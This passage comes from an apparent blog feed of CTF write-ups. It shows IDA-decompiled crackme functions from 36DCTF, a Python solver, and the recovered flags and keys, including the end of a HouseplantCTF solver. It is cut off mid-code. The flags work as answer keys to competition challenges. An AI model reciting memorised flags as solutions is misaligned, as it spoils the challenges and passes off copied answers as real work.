class="hljs-number">0</span>;i&lt;thefinalflag.length-<span class="hljs-number">3</span>;i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;</span><br><span class="line">            <span class="hljs-keyword">for</span>(;j&lt;realflag.length;j++)</span><br><span class="line">            {</span><br><span class="line">                <span class="hljs-keyword">if</span>(realflag[j]==i)</span><br><span class="line">                    <span class="hljs-keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            f[j]=(<span class="hljs-keyword">char</span>)thefinalflag[i];</span><br><span class="line">        }</span><br><span class="line">        System.out.println(f);</span><br><span class="line">        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=thefinalflag.length-<span class="hljs-number">3</span>;i&lt;thefinalflag.length;i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;</span><br><span class="line">            <span class="hljs-keyword">for</span>(;j&lt;therealflag.length;j++)</span><br><span class="line">            {</span><br><span class="line">                <span class="hljs-keyword">if</span>(therealflag[j]==i)</span><br><span class="line">                    <span class="hljs-keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            f[j]=(<span class="hljs-keyword">char</span>)thefinalflag[i];</span><br><span class="line">        }</span><br><span class="line">        System.out.println(f);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//rtcp{h3r3s_4_c0stly_fl4g_4you}</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> HouseplantCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36DCTF-wp</title>
      <link href="/2020/03/21/2020-36DCTF/"/>
      <url>/2020/03/21/2020-36DCTF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>2020-36DCTF</p><span id="more"></span><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>IDA打开是下面这个样子</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rcx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+4h] [rbp-8Ch]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+Ch] [rbp-84h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// [rsp+14h] [rbp-7Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [rsp+1Ch] [rbp-74h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [rsp+24h] [rbp-6Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [rsp+28h] [rbp-68h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// [rsp+2Ch] [rbp-64h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v17; <span class="hljs-comment">// [rsp+30h] [rbp-60h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v18; <span class="hljs-comment">// [rsp+34h] [rbp-5Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v19; <span class="hljs-comment">// [rsp+38h] [rbp-58h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v20; <span class="hljs-comment">// [rsp+3Ch] [rbp-54h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v21; <span class="hljs-comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v22; <span class="hljs-comment">// [rsp+44h] [rbp-4Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v23; <span class="hljs-comment">// [rsp+48h] [rbp-48h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v24; <span class="hljs-comment">// [rsp+4Ch] [rbp-44h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v25; <span class="hljs-comment">// [rsp+50h] [rbp-40h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v26; <span class="hljs-comment">// [rsp+54h] [rbp-3Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v27; <span class="hljs-comment">// [rsp+58h] [rbp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v28; <span class="hljs-comment">// [rsp+5Ch] [rbp-34h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v29; <span class="hljs-comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v30; <span class="hljs-comment">// [rsp+64h] [rbp-2Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v31; <span class="hljs-comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v32; <span class="hljs-comment">// [rsp+6Ch] [rbp-24h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v33; <span class="hljs-comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v34; <span class="hljs-comment">// [rsp+74h] [rbp-1Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v35; <span class="hljs-comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v36; <span class="hljs-comment">// [rsp+7Ch] [rbp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v37; <span class="hljs-comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v38; <span class="hljs-comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v39; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v40; <span class="hljs-comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="hljs-number">102</span>;</span><br><span class="line">  v10 = <span class="hljs-number">109</span>;</span><br><span class="line">  v11 = <span class="hljs-number">99</span>;</span><br><span class="line">  v12 = <span class="hljs-number">98</span>;</span><br><span class="line">  v13 = <span class="hljs-number">127</span>;</span><br><span class="line">  v14 = <span class="hljs-number">58</span>;</span><br><span class="line">  v15 = <span class="hljs-number">85</span>;</span><br><span class="line">  v16 = <span class="hljs-number">106</span>;</span><br><span class="line">  v17 = <span class="hljs-number">57</span>;</span><br><span class="line">  v18 = <span class="hljs-number">82</span>;</span><br><span class="line">  v19 = <span class="hljs-number">122</span>;</span><br><span class="line">  v20 = <span class="hljs-number">55</span>;</span><br><span class="line">  v21 = <span class="hljs-number">81</span>;</span><br><span class="line">  v22 = <span class="hljs-number">19</span>;</span><br><span class="line">  v23 = <span class="hljs-number">51</span>;</span><br><span class="line">  v24 = <span class="hljs-number">35</span>;</span><br><span class="line">  v25 = <span class="hljs-number">67</span>;</span><br><span class="line">  v26 = <span class="hljs-number">70</span>;</span><br><span class="line">  v27 = <span class="hljs-number">41</span>;</span><br><span class="line">  v28 = <span class="hljs-number">61</span>;</span><br><span class="line">  v29 = <span class="hljs-number">41</span>;</span><br><span class="line">  v30 = <span class="hljs-number">32</span>;</span><br><span class="line">  v31 = <span class="hljs-number">127</span>;</span><br><span class="line">  v32 = <span class="hljs-number">28</span>;</span><br><span class="line">  v33 = <span class="hljs-number">38</span>;</span><br><span class="line">  v34 = <span class="hljs-number">77</span>;</span><br><span class="line">  v35 = <span class="hljs-number">49</span>;</span><br><span class="line">  v36 = <span class="hljs-number">20</span>;</span><br><span class="line">  v37 = <span class="hljs-number">80</span>;</span><br><span class="line">  v38 = <span class="hljs-number">94</span>;</span><br><span class="line">  v39 = <span class="hljs-number">0xFFFFFFE8</span>;</span><br><span class="line">  <span class="hljs-built_in">sub_4007F8</span>((__int64)&amp;v40, <span class="hljs-number">0LL</span>, <span class="hljs-number">4LL</span>);</span><br><span class="line">  v7 = <span class="hljs-number">0</span>;</span><br><span class="line">  v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">sub_400808</span>((__int64)aFlag);</span><br><span class="line">  <span class="hljs-keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    v8 = <span class="hljs-built_in">sub_400818</span>((__int64)aFlag, <span class="hljs-number">0LL</span>);</span><br><span class="line">    v6 |= v8 ^ v7 ^ (v7 + (v7 ^ *(&amp;v9 + (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v7)));</span><br><span class="line">    v4 = v7++;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">while</span> ( v8 &amp;&amp; v8 != <span class="hljs-number">10</span> &amp;&amp; v8 != <span class="hljs-number">-1</span> );</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v6 )</span><br><span class="line">    <span class="hljs-built_in">sub_400828</span>(aFailed, <span class="hljs-number">0LL</span>, v3, v4);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-built_in">sub_400828</span>(aCorrect, <span class="hljs-number">0LL</span>, v3, v4);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>很简单，写个脚本就出来了，签到成功</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">102</span>, <span class="hljs-number">109</span>, <span class="hljs-number">99</span>, <span class="hljs-number">98</span>, <span class="hljs-number">127</span>, <span class="hljs-number">58</span>, <span class="hljs-number">85</span>, <span class="hljs-number">106</span>, <span class="hljs-number">57</span>, <span class="hljs-number">82</span>, <span class="hljs-number">122</span>, <span class="hljs-number">55</span>, <span class="hljs-number">81</span>, <span class="hljs-number">19</span>, <span class="hljs-number">51</span>, <span class="hljs-number">35</span>, <span class="hljs-number">67</span>, <span class="hljs-number">70</span>, <span class="hljs-number">41</span>, <span class="hljs-number">61</span>, <span class="hljs-number">41</span>, <span class="hljs-number">32</span>, <span class="hljs-number">127</span>, <span class="hljs-number">28</span>, <span class="hljs-number">38</span>, <span class="hljs-number">77</span>,</span><br><span class="line">          <span class="hljs-number">49</span>, <span class="hljs-number">20</span>, <span class="hljs-number">80</span>, <span class="hljs-number">94</span>]</span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(target)):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(i ^ (i + (i ^ target[i])))</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># flag{A_s1mpLe&amp;E4sy_RE_i5Nt_1t}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="神光"><a href="#神光" class="headerlink" title="神光"></a>神光</h4><p>IDA打开，根据提示语找到关键函数</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __usercall sub_415C10@&lt;eax&gt;(<span class="hljs-keyword">int</span> a1@&lt;xmm0&gt;, <span class="hljs-keyword">int</span> a2@&lt;ebx&gt;)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// ST0C_4</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [esp+0h] [ebp-ECh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> input1; <span class="hljs-comment">// [esp+D0h] [ebp-1Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v17; <span class="hljs-comment">// [esp+E8h] [ebp-4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> savedregs; <span class="hljs-comment">// [esp+ECh] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">sub_41122B</span>((<span class="hljs-keyword">int</span>)&amp;unk_41C032);</span><br><span class="line">  <span class="hljs-built_in">sub_411406</span>();</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">printf</span>((<span class="hljs-keyword">int</span>)<span class="hljs-string">"请输入key:\n"</span>, v15);</span><br><span class="line">    <span class="hljs-built_in">scanf</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;unk_417B40, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)&amp;input1, <span class="hljs-number">20</span>);</span><br><span class="line">    <span class="hljs-built_in">sub_4113B1</span>(a1, &amp;input1);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( target1 )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    v2 = <span class="hljs-built_in">puts</span>(<span class="hljs-string">"系统错误,请再试一次\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">sub_411235</span>(v4, v3, &amp;v15 == &amp;v15, v2, a1);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">sub_41141A</span>(a1);</span><br><span class="line">  v5 = <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">"认证成功,离flag又近了一步"</span>, <span class="hljs-string">"恭喜"</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">sub_411235</span>(v7, v6, &amp;v15 == &amp;v15, v5, a1);</span><br><span class="line">  <span class="hljs-built_in">sub_4113CF</span>(a1, v8, a2, (<span class="hljs-keyword">int</span>)&amp;v15, &amp;input1);</span><br><span class="line">  v9 = <span class="hljs-built_in">system</span>(<span class="hljs-string">"pause"</span>);</span><br><span class="line">  <span class="hljs-built_in">sub_411235</span>(v11, v10, &amp;v15 == &amp;v15, v9, a1);</span><br><span class="line">  v13 = v12;</span><br><span class="line">  <span class="hljs-built_in">sub_411258</span>((<span class="hljs-keyword">int</span>)&amp;savedregs, (<span class="hljs-keyword">int</span>)byte_415D18);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_411235</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)&amp;savedregs ^ v17, v13, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输入key之后在下面的函数里进行验证</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __usercall sub_415B10@&lt;eax&gt;(<span class="hljs-keyword">int</span> a1@&lt;xmm0&gt;, <span class="hljs-keyword">char</span> *input1)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// rtt</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// ST04_4</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// ST00_4</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [esp+0h] [ebp-E8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Str2; <span class="hljs-comment">// [esp+D0h] [ebp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v14; <span class="hljs-comment">// [esp+D1h] [ebp-17h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [esp+D2h] [ebp-16h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v16; <span class="hljs-comment">// [esp+D3h] [ebp-15h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// [esp+D4h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v18; <span class="hljs-comment">// [esp+D5h] [ebp-13h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v19; <span class="hljs-comment">// [esp+D6h] [ebp-12h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v20; <span class="hljs-comment">// [esp+D7h] [ebp-11h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v21; <span class="hljs-comment">// [esp+D8h] [ebp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v22; <span class="hljs-comment">// [esp+D9h] [ebp-Fh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v23; <span class="hljs-comment">// [esp+DAh] [ebp-Eh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v24; <span class="hljs-comment">// [esp+DBh] [ebp-Dh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v25; <span class="hljs-comment">// [esp+DCh] [ebp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v26; <span class="hljs-comment">// [esp+DDh] [ebp-Bh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v27; <span class="hljs-comment">// [esp+DEh] [ebp-Ah]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v28; <span class="hljs-comment">// [esp+E4h] [ebp-4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> savedregs; <span class="hljs-comment">// [esp+E8h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">sub_41122B</span>((<span class="hljs-keyword">int</span>)&amp;unk_41C032);</span><br><span class="line">  Str2 = <span class="hljs-string">'w'</span>;</span><br><span class="line">  v14 = <span class="hljs-string">'a'</span>;</span><br><span class="line">  v15 = <span class="hljs-string">'n'</span>;</span><br><span class="line">  v16 = <span class="hljs-string">'g'</span>;</span><br><span class="line">  v17 = <span class="hljs-string">'z'</span>;</span><br><span class="line">  v18 = <span class="hljs-string">'h'</span>;</span><br><span class="line">  v19 = <span class="hljs-string">'e'</span>;</span><br><span class="line">  v20 = <span class="hljs-string">'r'</span>;</span><br><span class="line">  v21 = <span class="hljs-string">'o'</span>;</span><br><span class="line">  v22 = <span class="hljs-string">'n'</span>;</span><br><span class="line">  v23 = <span class="hljs-string">'g'</span>;</span><br><span class="line">  v24 = <span class="hljs-string">'y'</span>;</span><br><span class="line">  v25 = <span class="hljs-string">'a'</span>;</span><br><span class="line">  v26 = <span class="hljs-string">'o'</span>;</span><br><span class="line">  v27 = <span class="hljs-number">0</span>;</span><br><span class="line">  v2 = <span class="hljs-built_in">j_strcmp</span>(input1, &amp;Str2);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v2 )</span><br><span class="line">  {</span><br><span class="line">    target1 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v4 = <span class="hljs-built_in">rand</span>();</span><br><span class="line">    v7 = <span class="hljs-built_in">sub_411235</span>(v6, v5, &amp;v12 == &amp;v12, v4, a1);</span><br><span class="line">    v8 = v7;</span><br><span class="line">    v2 = v7 / <span class="hljs-number">10</span>;</span><br><span class="line">    v3 = v8 % <span class="hljs-number">10</span>;</span><br><span class="line">    target1 = v8 % <span class="hljs-number">10</span>;</span><br><span class="line">  }</span><br><span class="line">  v9 = v3;</span><br><span class="line">  v10 = v2;</span><br><span class="line">  <span class="hljs-built_in">sub_411258</span>((<span class="hljs-keyword">int</span>)&amp;savedregs, (<span class="hljs-keyword">int</span>)dword_415BEC);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_411235</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)&amp;savedregs ^ v28, v9, <span class="hljs-number">1</span>, v10, a1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输入的<code>key</code>应该是<code>wangzherongyao</code></p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __usercall sub_415770@&lt;eax&gt;(<span class="hljs-keyword">int</span> a1@&lt;xmm0&gt;, <span class="hljs-keyword">int</span> a2@&lt;ecx&gt;, <span class="hljs-keyword">int</span> a3@&lt;ebx&gt;, <span class="hljs-keyword">int</span> a4@&lt;esi&gt;, <span class="hljs-keyword">char</span> *Str)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">size_t</span> v5; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// [esp+0h] [ebp-15D8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [esp+610h] [ebp-FC8h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+61Ch] [ebp-FBCh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [esp+15C4h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [esp+15C8h] [ebp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [esp+15D0h] [ebp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> savedregs; <span class="hljs-comment">// [esp+15D8h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">sub_4113ED</span>(<span class="hljs-number">0x15D8</span>u, a2);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;v10, <span class="hljs-number">0xCC</span>u, <span class="hljs-number">0x15D8</span>u);</span><br><span class="line">  <span class="hljs-built_in">sub_41122B</span>((<span class="hljs-keyword">int</span>)&amp;unk_41C032);</span><br><span class="line">  v15 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span 